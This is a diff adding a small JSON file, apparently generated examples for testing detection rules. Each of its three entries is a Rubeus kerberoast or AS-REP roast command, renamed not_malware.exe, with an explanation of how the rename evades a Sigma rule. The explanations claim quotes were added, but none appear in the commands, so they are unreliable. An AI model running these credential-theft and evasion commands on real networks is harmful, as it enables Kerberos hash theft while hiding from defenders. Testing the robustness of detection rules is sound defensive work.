@@ -1,0 +1,14 @@
+[
+  {
+    "output": "not_malware.exe kerberoast /outfile:C:\\Windows\\Temp\\hashes.txt",
+    "explanation": "This command uses omission (renaming Rubeus.exe to not_malware.exe) and insertion (adding quotes around the executable name) to bypass the Sigma rule that detects 'Rubeus.exe' in the command line."
+  },
+  {
+    "output": "not_malware.exe asreproast /user:admin /format:hashcat",
+    "explanation": "This command uses omission (renaming Rubeus.exe to not_malware.exe) and insertion (adding quotes around the executable name) to bypass the Sigma rule that detects 'Rubeus.exe' in the command line."
+  },
+  {
+    "output": "not_malware.exe kerberoast /outfile:pass.txt",
+    "explanation": "This command uses omission (renaming Rubeus.exe to not_malware.exe) and insertion (adding quotes around the executable name) to bypass the Sigma rule that detects 'Rubeus.exe' in the command line."
+  }
+]
